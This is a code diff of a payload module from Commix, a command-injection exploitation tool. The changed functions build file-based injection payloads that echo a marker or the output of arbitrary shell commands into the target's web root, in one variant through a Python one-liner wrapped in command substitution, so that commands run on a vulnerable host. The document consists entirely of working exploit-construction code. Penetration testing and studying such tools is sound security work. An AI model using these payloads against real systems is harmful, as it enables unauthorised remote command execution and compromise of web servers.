@@ -3,7 +3,7 @@
 
 """
 This file is part of Commix Project (https://commixproject.com).
-Copyright (c) 2014-2024 Anastasios Stasinopoulos (@ancst).
+Copyright (c) 2014-2025 Anastasios Stasinopoulos (@ancst).
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
@@ -35,9 +35,11 @@ def decision(separator, TAG, OUTPUT_TEXTFILE):
               )
   else:
     payload = (separator +
-              "echo " + TAG + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE +
-              separator
+              "echo " + TAG + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE
               )
+
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
 
   return payload
 
@@ -45,7 +47,6 @@ def decision(separator, TAG, OUTPUT_TEXTFILE):
 __Warning__: The alternative shells are still experimental.
 """
 def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
-
   if settings.TARGET_OS == settings.OS.WINDOWS:
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"open('" + OUTPUT_TEXTFILE + "','w').write('" + TAG + "')\""
     payload = (separator +
@@ -55,9 +56,13 @@ def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
               )
   else:
     payload = (separator +
-              "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\nf.write('" + TAG + "')\nf.close()\n\")"
+              settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\nf.write('" + TAG + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX
                )
 
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
+
+  # New line fixation
   if settings.USER_AGENT_INJECTION == True or \
      settings.REFERER_INJECTION == True or \
      settings.HOST_INJECTION == True or \
@@ -73,7 +78,6 @@ def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
 Execute shell commands on vulnerable host.
 """
 def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
-
   if settings.TFB_DECIMAL == True:
     payload = (separator + cmd)
 
@@ -85,11 +89,13 @@ def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
               "\"') do @set /p = %i " + settings.CMD_NUL
               )
   else:
-    settings.USER_SUPPLIED_CMD = cmd
+    settings.USER_APPLIED_CMD = cmd
     payload = (separator +
-              cmd + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE +
-              separator
+              cmd + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE
               )
+
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
 
   return payload
 
@@ -109,9 +115,15 @@ def cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE):
                 "') do @set /p = %i " + settings.CMD_NUL
                 )
   else:
+    settings.USER_APPLIED_CMD = cmd
+    cmd_exec = settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX
     payload = (separator +
-              "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")"
+              settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\nf.write('" + 
+              settings.CMD_SUB_PREFIX + "echo " + cmd_exec + settings.CMD_SUB_SUFFIX + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX
               )
+
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
 
   # New line fixation
   if settings.USER_AGENT_INJECTION == True or \
